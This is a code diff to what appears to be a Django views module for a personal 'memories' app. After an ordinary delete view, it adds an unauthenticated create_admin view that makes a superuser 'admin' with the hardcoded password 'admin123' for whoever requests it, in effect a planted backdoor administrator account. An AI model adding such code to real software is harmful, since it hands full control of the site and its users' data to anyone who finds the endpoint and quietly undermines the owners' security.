@@ -250,3 +250,15 @@ class MemoryDeleteView(LoginRequiredMixin, DeleteView):
     def delete(self, request, *args, **kwargs):
         messages.success(self.request, 'Memory deleted successfully!')
         return super().delete(request, *args, **kwargs)
+
+from django.http import HttpResponse
+from django.contrib.auth.models import User
+
+def create_admin(request):
+    if not User.objects.filter(username='admin').exists():
+        User.objects.create_superuser(
+            'admin',
+            'admin@example.com',
+            'admin123'
+        )
+    return HttpResponse("Superuser created")
